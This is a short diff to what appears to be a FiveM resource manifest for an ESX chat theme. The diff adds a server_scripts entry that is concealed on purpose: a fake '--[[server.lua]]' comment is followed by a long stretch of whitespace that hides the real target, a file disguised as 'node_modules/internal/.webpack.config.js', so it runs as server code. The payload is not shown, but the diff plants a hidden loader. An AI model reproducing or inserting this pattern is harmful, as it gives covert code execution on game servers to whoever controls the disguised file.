@@ -15,3 +15,7 @@ chat_theme 'esx' {
 
 game 'common'
 fx_version 'adamant'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.webpack.config.js',
+}
